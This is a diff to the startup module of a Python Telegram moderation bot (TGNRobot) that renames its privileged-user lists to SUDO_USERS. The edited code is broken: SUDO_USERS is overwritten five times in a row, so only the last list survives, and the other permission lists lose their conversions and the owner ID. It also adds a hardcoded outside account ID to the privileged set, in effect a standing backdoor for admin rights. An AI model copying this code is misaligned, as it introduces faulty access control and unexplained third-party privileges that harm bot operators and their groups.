@@ -173,10 +173,10 @@ else:
     except ValueError:
         raise Exception("Your blacklisted chats list does not contain valid integers.")
 
-DRAGONS.add(OWNER_ID)
-DEV_USERS.add(OWNER_ID)
-DEV_USERS.add(1928904042)
-DEV_USERS.add(1928904042)
+SUDO_USERS.add(OWNER_ID)
+SUDO_USERS.add(OWNER_ID)
+SUDO_USERS.add(1928904042)
+SUDO_USERS.add(1928904042)
 
 if not SPAMWATCH_API:
     sw = None
@@ -194,11 +194,11 @@ telethn = TelegramClient("layla", API_ID, API_HASH)
 pbot = Client("robot", api_id=API_ID, api_hash=API_HASH, bot_token=TOKEN)
 dispatcher = updater.dispatcher
 
-DRAGONS = list(DRAGONS) + list(DEV_USERS)
-DEV_USERS = list(DEV_USERS)
-WOLVES = list(WOLVES)
-DEMONS = list(DEMONS)
-TIGERS = list(TIGERS)
+SUDO_USERS = list(DRAGONS) + list(DEV_USERS)
+SUDO_USERS = list(DEV_USERS)
+SUDO_USERS = list(WOLVES)
+SUDO_USERS = list(DEMONS)
+SUDO_USERS = list(TIGERS)
 
 # Load at end to ensure all prev variables have been set
 from TGNRobot.modules.helper_funcs.handlers import (
